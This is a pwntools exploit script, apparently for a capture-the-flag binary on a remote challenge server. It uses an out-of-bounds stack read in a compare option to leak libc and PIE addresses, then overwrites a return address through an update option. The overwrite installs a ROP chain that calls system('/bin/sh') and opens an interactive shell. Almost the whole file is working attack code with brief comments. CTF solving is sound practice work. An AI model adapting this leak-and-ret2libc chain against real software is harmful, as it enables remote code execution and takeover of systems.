from pwn import *

"""
a1 = {
    name -> malloc(0x100),
    time = ll 
} on stack

oob r/w on stack
in update_data, compare_driver
tele $rbp-0x10
"""


# context.log_level = "debug"
libc = ELF("./libc.so.6") #./libc-2.27.so
elf = ELF("./fla")
# libc = ELF("./libc-2.27.so")


r = remote("challenge.stdio.2600.in.th",30506)
# r = gdb.debug("./fla",gdbscript="""
# break *handler+244
# # break *handler+51
# c
# tele $rbp-0x10
# """)
#find $rbp-0x10 index 20
#v6 = v7 * 60000 + v8 * 1000 + v9;

def wait():
    r.recvuntil(b"exit")
wait()
def send(s):
    r.sendline(s)
def cal_leak(s):
    tmp = s.decode().split(":")
    v7 = int(tmp[0])
    v8 = int(tmp[1])
    v9 = int(tmp[2])
    v6 = v7 * 60000 + v8 * 1000 + v9
    return v6

send(b"1")
send(b"1")
send(b"AAAA")
send(b"0")

send(b"4")
send(b"23") #compare 33 (__libc_start_main+133)
send(b"1") #with 1

r.recvuntil("Raw:")
leak_libc_start_call_main = cal_leak(r.recvuntil(b"  vs")[1:-4])
# info(f"{hex(leak_libc_start_call_main)}")

send(b"4")
send(b"22") #compare 22 (ret addr)
send(b"1") #with 1

r.recvuntil(b"Raw:")
leak_main = cal_leak(r.recvuntil(b"  vs")[1:-4])
# info(f"{hex(leak_main)}")

"""
    pivot
    pop rbp ret
"""

base_bin = (leak_main-109)-elf.sym.main
libc_base = leak_libc_start_call_main-231-libc.sym.__libc_start_main
libc.address = libc_base
info(f"PIE : {hex(base_bin)}")
info(f"LIBC : {hex(libc_base)}")

# payload = p64(libc_base + 0x000000000002a145) #0x000000000002164f pop rdi
payload =  p64(0) #junk
payload += p64(base_bin + 0x00000000000017a3) #pop rdi 
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(base_bin + 0x1732) #ret
payload += p64(libc.sym.system)


payload2 = str(base_bin + 0x00000000000017a3) #pop rdi; ret

wait()

send(b"3")
send(b"22") #update 22
send(b"2") # ret
r.recvuntil(b"(ms) ")
send(payload2.encode())
wait()

send(b"3")
send(b"22") #update 22
send(b"1") # name
send(payload)

#let go vromm vroom

r.interactive()
# try 23